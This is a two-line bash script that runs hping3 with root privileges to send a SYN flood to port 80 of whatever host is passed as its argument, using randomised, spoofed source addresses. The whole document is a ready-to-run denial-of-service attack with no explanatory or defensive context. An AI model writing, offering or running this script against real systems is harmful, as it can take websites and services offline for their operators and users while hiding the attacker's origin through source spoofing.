#!/bin/bash
sudo hping3 -S -p 80 --flood "$1" --rand-source
